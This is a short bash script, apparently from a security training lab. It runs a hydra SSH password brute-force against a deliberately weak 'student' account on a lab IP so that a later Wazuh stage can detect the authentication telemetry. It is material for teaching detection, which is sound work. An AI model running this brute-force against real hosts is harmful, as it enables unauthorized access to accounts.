#!/bin/bash
# Example Stage 1 activity: password bruteforce against the endpoint's
# intentionally weak 'student' account. Used to generate auth telemetry
# that Stage 2 (Wazuh) will later pick up.
TARGET=${1:-10.10.10.10}
hydra -l student -P /opt/scripts/wordlist.txt ssh://"$TARGET"
